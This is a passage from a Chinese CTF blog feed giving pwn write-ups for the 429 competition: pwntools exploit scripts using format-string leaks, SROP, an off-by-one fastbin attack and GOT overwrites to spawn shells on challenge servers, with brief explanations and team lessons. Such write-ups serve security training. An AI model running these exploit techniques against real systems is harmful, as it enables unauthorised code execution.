class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"input pattern\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line">ru(<span class="string">"name="</span>)</div><div class="line"></div><div class="line">puts_addr = u64(ru(<span class="string">"\nhashcode"</span>)[:<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(elf.symbols[<span class="string">"puts"</span>]-elf.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line">free_hook_addr = puts_addr+(<span class="number">0x00000035f79906e8</span> - elf.symbols[<span class="string">"puts"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"free_hook_addr="</span>+hex(free_hook_addr)</div><div class="line"><span class="comment">## edit atoi to system</span></div><div class="line"></div><div class="line"><span class="comment">## stage 7 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x48</span><span class="number">-1</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 8 edit chunk id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x8</span><span class="number">-1</span>)+p64(<span class="number">0</span>)+p64(free_hook_addr)[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 9 edit free_hook to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">sl(p64(system_addr)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line"><span class="comment"># stage 10 system</span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">p.interacive()</div></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>该pwn程序存在两个漏洞，一个是格式化字符串漏洞，一个是栈溢出漏洞，我们可以利用格式化字符串漏洞泄露libc地址，然后利用栈溢出漏洞，构造ropchain，实现shell的获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 21:39:25</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.43"</span></div><div class="line">port = <span class="number">5011</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0400C84\nc")</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line">payload = <span class="string">"%19$llX"</span></div><div class="line">binhex = binascii.b2a_hex(payload)</div><div class="line"><span class="comment"># print binhex</span></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>*(len(binhex)))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(binhex)</div><div class="line">ru(<span class="string">"sult is: \n"</span>)</div><div class="line"></div><div class="line">libc_start_addr = int(ru(<span class="string">"Please "</span>)[:len(<span class="string">"7f041e5cda"</span>)],<span class="number">16</span>) - <span class="number">240</span></div><div class="line"><span class="comment"># print len(libc_start_addr)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_start_addr="</span>+hex(libc_start_addr)</div><div class="line">libc_base = libc_start_addr - <span class="number">0x1ec20</span></div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line">_binsh = libc_base+<span class="number">0x155e43</span></div><div class="line"><span class="keyword">print</span>  <span class="string">"_binsh="</span>+hex(_binsh)</div><div class="line"><span class="comment"># _binsh = libc_base+0x18C385</span></div><div class="line"></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"urn\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">payload = p64(system_addr)+p64(<span class="number">0</span>)+p64(_binsh)</div><div class="line">payload = binascii.b2a_hex(payload)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x90</span>+payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;下次pwn选手真的不该去429线下。。这BGM神TM的= =。。&lt;/p&gt;
&lt;p&gt;比赛很稳，主队拿了第7，分队第12，不过需要反思的是：&lt;/p&gt;
&lt;p&gt;1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）&lt;/p&gt;
&lt;p&gt;2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。&lt;/p&gt;
&lt;p&gt;3、写好的exp脚本交由负责流量审计的队友来维护&lt;/p&gt;
&lt;p&gt;4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。&lt;/p&gt;
&lt;p&gt;5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag&lt;/p&gt;
&lt;p&gt;6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。&lt;/p&gt;
&lt;p&gt;7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手&lt;/p&gt;
&lt;p&gt;8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ&lt;/p&gt;
&lt;p&gt;进入主题吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="AWD" scheme="https://winter3un.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429预赛</title>
    <link href="https://winter3un.github.io/2017/04/22/429-2017/"/>
    <id>https://winter3un.github.io/2017/04/22/429-2017/</id>
    <published>2017-04-22T14:38:33.000Z</published>
    <updated>2017-05-02T13:50:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。</p><p>不过pwn1和pwn2收获都很大，特别记录下。</p><a id="more"></a><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>pwn1很短很强悍~</p><p>用到了SROP技术，参考资料</p><ul><li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="external">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>elf文件非常小，只有几行指令。使用syscall 0 读取用户的输入至栈中。<br>我们虽然可以控制程序的执行流，但是我们没办法控制寄存器的数值。正常利用条件为：控制rax为59，控制rdi为“/bin/sh”字符串的地址，rip指向syscall。后来想了想，rax的数值可以通过输入的字符数来控制，那么现在我们已经可以控制syscall调用execute了，但是我们却不能控制rdi的数值，这里我们可以利用SROP的技术，对所有寄存器进行重新赋值，使rdi指向“/bin/sh”的地址。然而利用SROP需要以下几个条件。</p><p>第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；(√)</p><p>第二，需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；（√<br>我们可以通过系统调用 1 write函数，进行栈空间信息泄露）</p><p>第三，需要知道<code>syscall</code>指令在内存中的地址(√)；</p><p>第四，需要知道<code>sigreturn</code>系统调用的内存地址(我们可以利用系统调用号 15 调用该函数)。</p><p>因此条件全部满足的情况下，我们利用SROP技术将rdi覆写，那么我们就可以顺利执行 execve（“/bin/sh”,null.null）;啦。（ps：需要注意的是，send过去的数据要有延迟，不然会认为是在一起的）exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-19 23:10:33</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"amd64"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./smallest"</span></div><div class="line">remote_ip = <span class="string">"106.75.61.55"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rdx = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsp = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line"><span class="comment"># write</span></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0x4000B3</span>)+p64(<span class="number">0x4000B0</span>)</div><div class="line">sd(payload)</div><div class="line">sd(<span class="string">"\xb3"</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = u64(p.recv(<span class="number">16</span>)[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x1000</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line"></div><div class="line"><span class="comment"># frame </span></div><div class="line"><span class="comment"># call read into stack_addr</span></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_read</div><div class="line">frame.rdi = <span class="number">0x0</span></div><div class="line">frame.rsi = stack_addr</div><div class="line">frame.rdx = <span class="number">0x400</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#frame</span></div><div class="line"><span class="comment"># write /bin/sh</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = stack_addr+<span class="number">0x150</span></div><div class="line">frame.rsi = <span class="number">0x0</span></div><div class="line">frame.rdx = <span class="number">0x0</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000Be</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x150</span>-len(payload))+<span class="string">"/bin/sh\x00"</span></div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>用到了很多姿势啊，台湾友人的pwn很强悍，hhhhhhh。</p><p>参考链接：<a href="http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/</a></p><p>非常坑的一点是，在ubuntu16.04下，scanf操作会在heap区域生成最少0x410大小的chunk。。。如果不知道这一点，这题是没法做的。（一定要在ubuntu16.04环境下测试该题哦~</p><p>步骤：</p><p>1、利用scanf在heap区域生成0x1000大小的chunk，在末尾伪造chunk头，注意调整合适的size。我这边调整为0x70的 chunk size</p><p>2、利用null字节溢出导致虚表指针最低位字节变成00字节，指向我们伪造的fake chunk<br>（注意，fake chunk是位于0x18大小的chunk之前的，<br>）</p><p>3、free fake chunk 在下次new的时候，我们申请同样大小的chunk，会从fastbin中拿到我们刚才伪造的fake chunk，同时可以输入内容，覆盖虚表指针，导致任意地址写。。</p><p>4、我们可以利用2操作覆盖掉got表，修改exit为alarm，使我们可以重复利用1、2、3函数。</p><p>5、修改atoi为printf（这姿势第一次），然后通过格式化字符串泄露libc</p><p>6、再次覆写got ，将atoi改成system就好啦。。需要注意的是，printf返回值是他显示的字符数~</p><p>非常nice的一题pwn，收获很大~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># off-by-one</span></div><div class="line"><span class="comment"># fastbin attack</span></div><div class="line"><span class="comment"># overwrite got</span></div><div class="line"><span class="comment"># fmt</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-20 03:15:30</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./hiddenlove"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment">#gdb.attach(p,"b*0x400B48\nb*0x400A1A\nc")</span></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x4008f4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 0</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"s for her?(Y/N)\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x1000</span><span class="number">-0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</div><div class="line"></div><div class="line"><span class="comment">## stage 1</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x20</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"\x00"</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line"><span class="comment">## stage 2</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"></div><div class="line"><span class="comment">## stage 3 </span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x60</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(addr))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"b"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># stage 4</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line"></div><div class="line">sd(data)</div><div class="line"></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">edit(rop.got[<span class="string">"free"</span>],payload)</div><div class="line"></div><div class="line"><span class="comment"># leak</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"puts"</span>]))</div><div class="line">puts_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="comment"># read(0,buf,0x10)</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"printf"</span>]))<span class="comment"># dl_reslove change printf_got</span></div><div class="line">printf_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(libc.symbols[<span 